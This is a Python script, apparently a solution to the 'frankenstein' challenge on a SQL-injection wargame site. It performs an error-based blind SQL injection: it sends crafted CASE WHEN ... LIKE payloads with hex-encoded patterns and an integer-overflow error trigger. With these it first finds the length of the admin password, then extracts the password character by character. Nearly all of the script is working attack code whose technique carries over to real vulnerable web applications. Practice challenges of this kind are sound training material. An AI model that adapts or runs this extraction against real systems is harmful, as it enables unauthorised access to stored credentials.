import requests
import binascii

cookie = {'PHPSESSID' : '~~~~'}
    
def str2hex(string_1):
    return binascii.hexlify(string_1.encode('utf-8')).decode('utf-8')

for i in range(1,100):
    url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?\
        pw=' or id='admin' and case when pw like 0x%s then 1 else 1%%2b~0 end%%23;" % (str2hex('_'*i))
    res = requests.get(url, cookies=cookie)
    print("%d ... " % i, end="")
    
    if not "<hr><br>error" in res.text:
        pw_len = i
        print("O")
        print("\n======================")
        print("admin pw length  |  %d" % pw_len)
        print("======================\n")
        break
    
    else:
        print("X")
        

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        tmp_str = pw_value + chr(j) + '%'
        url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?\
            pw=' or id='admin' and case when pw like binary 0x%s then 1 else 1%%2b~0 end%%23;" % (str2hex(tmp_str))
        res = requests.get(url, cookies=cookie)

        if not("<hr><br>error" in res.text) and (chr(j) != '%') and (chr(j) != '_'):
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
            

print("\n======================")
print("admin pw  |  %s" % pw_value)
print("======================\n")